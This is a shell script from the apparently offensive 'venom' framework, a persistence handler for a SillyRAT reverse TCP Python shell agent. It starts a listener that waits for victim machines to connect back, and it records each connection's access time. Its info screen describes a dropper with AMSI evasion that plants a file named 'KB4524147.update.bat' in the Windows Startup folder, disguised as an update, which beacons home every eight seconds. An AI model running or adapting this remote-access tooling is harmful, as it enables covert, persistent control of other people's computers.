#!/bin/sh
# Script version: v1.0
# Author: r00t-3xp10it (SSA RedTeam)
# Description: This Persistence handler script will store venom framework
# persistence handler settings/certificates in an compressed file (zip).
###


## Variable declarations
# venom.sh will config this settings
ID='NULL'
RPATH='NULL'
LPORT='NULL'
LHOST='NULL'
CLIENT='NULL'
DROPPER='NULL'
LAST_ACCESS='NULL'
FIRST_ACCESS='NULL'


## Colorise shell Script output leters
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}
Colors;


## Check for handler dependencies
if ! [ -e "server.py" ]; then
   echo ${RedF}"[ERROR] server.py not found in current directory .."
   sleep 2 && exit
fi


## Persistence Info Function
sh_Info () {
echo ""${BlueF}
echo "    Id           : $ID"
echo "    LPORT        : $LPORT"
echo "    LHOST        : $LHOST"
echo "    ACTIVE ON    : ${RedF}$FIRST_ACCESS${BlueF}"
echo "    LAST ACCESS  : $LAST_ACCESS"
echo "    DROPPERNAME  : $DROPPER"
echo "    CATEGORIE    : Amsi Evasion (agent nº6)"
echo "    DESCRIPTION  : Reverse TCP python Shell (SillyRAT)"
echo "    AGENT RPATH  : $RPATH"
echo "    PERSISTENCE  : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat"
echo ""
echo "    Detail Description"
echo "    ------------------"
echo "    If sellected 'add persistence' to dropper in venom amsi evasion agent nº6"
echo "    Them the dropper when executed it will create in remote target startup folder"
echo "    one script named 'KB4524147.update.bat' that beacons home from 8 to 8 sec"
echo "    on every target startup until a valid tcp connection is found (client.py)."
echo "    'Venom also creates this handler file (zip) to store persistence settings'."
echo "" && echo ${BlueF}:Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
read op
cls
}


## Persistence Start handler Function
sh_Start () {
echo "${YellowF}Waiting for ${BlueF}TCP${YellowF} connection ..";sleep 1
service apache2 start > /dev/null 2>&1
xterm -T " SILLYRAT LISTENER => $LHOST:$LPORT" -geometry 110x23 -e "python3 server.py bind --address 0.0.0.0 --port $LPORT"

## Config this handler settings
dtr=$(date|awk {'print $2,$3,$4,$5'})
LAST=$(cat handler.sh | egrep -m 1 "LAST_ACCESS") > /dev/null 2>&1
sed -i "s|$LAST|LAST_ACCESS='$dtr'|" handler.sh
service apache2 stop > /dev/null 2>&1
cls
}


## handler.sh exit Function
sh_Exit () {
echo ${YellowF}"Compressing (zip) handler files ..";sleep 2
## zip handler files (settings/certificates)
zip handler_ID:$ID.zip handler.sh server.py README -m -q
## exit
exit
}




## MAIN MENU SHELLCODE GENERATOR
# Loop forever menu Function
while :
do
clear && echo ${BlueF}
cat << !
    __    _ ______  ____   _  _____  ____    __
   \  \  //|   ___||    \ | |/     \|    \  /  |
    \  \// |   ___||     \| ||     ||     \/   |
     \__/  |______||__/\____|\_____/|__/\__/|__|
            'Persistence handler script'


!
echo "${YellowF}    Id      LocalHost           ActiveOn"${BlueF};
echo "${BlueF}    ----    ------------        ------------"${BlueF};
echo "${RedF}    $ID${BlueF}     $LHOST:$LPORT    $FIRST_ACCESS"${BlueF};
echo "" && echo "${YellowF}    Commands    Description"${BlueF};
cat << !
    --------    -----------
    Info        Detail information about this handler
    Start       Start this stored handler (Listenner)
    Exit        Exit this stored handler and zip files.


!

echo -n ${BlueF}":Handler> "${Reset}
read choice
case $choice in
Info|info|INFO) sh_Info ;;
Start|start|START) sh_Start ;;
Exit|exit|EXIT) sh_Exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Command${Reset}; sleep 2 ;;
esac
done
